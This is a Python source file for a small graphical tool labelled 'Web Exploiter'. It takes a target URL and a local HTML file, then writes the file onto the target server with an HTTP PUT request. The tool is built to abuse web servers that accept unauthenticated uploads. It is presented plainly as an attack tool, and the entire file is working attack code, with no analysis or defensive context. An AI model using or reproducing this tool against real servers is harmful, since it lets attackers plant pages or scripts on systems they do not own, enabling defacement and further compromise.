#!/usr/bin/python

import sys
import os
import requests
from PySide2.QtWidgets import QApplication, QWidget, QLabel, QPushButton, QFileDialog, QLineEdit, QMessageBox

class WebExploiter(QWidget):
    def __init__(self):
        super().__init__()
        self.title = "Web Exploiter"
        self.left = 100
        self.top = 100
        self.width = 500
        self.height = 400
        self.initUI()

    def initUI(self):
        self.setWindowTitle(self.title)
        self.setGeometry(self.left, self.top, self.width, self.height)

        self.hostLabel = QLabel(self)
        self.hostLabel.setText("Target URL:")
        self.hostLabel.move(20, 20)

        self.hostTextbox = QLineEdit(self)
        self.hostTextbox.move(120, 20)
        self.hostTextbox.resize(350, 25)

        self.browseButton = QPushButton('Browse', self)
        self.browseButton.move(20, 80)
        self.browseButton.resize(80, 25)
        self.browseButton.clicked.connect(self.openFileDialog)

        self.fileLabel = QLabel(self)
        self.fileLabel.setText("File to upload:")
        self.fileLabel.move(120, 80)

        self.fileTextbox = QLineEdit(self)
        self.fileTextbox.move(220, 80)
        self.fileTextbox.resize(250, 25)

        self.exploitButton = QPushButton('Exploit', self)
        self.exploitButton.move(20, 140)
        self.exploitButton.resize(450, 40)
        self.exploitButton.clicked.connect(self.exploit)

        self.quitButton = QPushButton('Quit', self)
        self.quitButton.move(20, 200)
        self.quitButton.resize(450, 40)
        self.quitButton.clicked.connect(self.quit)

        self.show()

    def openFileDialog(self):
        filename, _ = QFileDialog.getOpenFileName(self, "Open file", "", "HTML files (*.html)")
        if filename:
            self.fileTextbox.setText(filename)

    def exploit(self):
        host = self.hostTextbox.text()
        filename = self.fileTextbox.text()

        if not host.startswith('http'):
            host = 'http://' + host

        if not filename:
            QMessageBox.warning(self, "Error", "Please select a file to upload.")
            return

        if not os.path.isfile(filename):
            QMessageBox.warning(self, "Error", "The selected file does not exist.")
            return

        try:
            with open(filename, 'rb') as f:
                script = f.read()

            print("[*] UPLOAD FILENAME : %s" % (os.path.basename(filename)))
            print("[*] UPLOADING %d BYTES, SCRIPT" % len(script))

            r = requests.request('put', host + "/" + os.path.basename(filename), data=script, headers={'Content-Type':'application/octet-stream'})

            if r.status_code < 200 or r.status_code >= 300:
                QMessageBox.warning(self, "Error", "Upload failed.")
            else:
                QMessageBox.information(self, "Success", "File uploaded successfully.")
        except Exception as e:
            QMessageBox.warning(self, "Error", "Upload failed: " + str(e))

    def quit(self):
        sys.exit()

if __name__ == '__main__':
    app = QApplication(sys.argv)
    ex = WebExploiter()
    sys.exit(app.exec_())
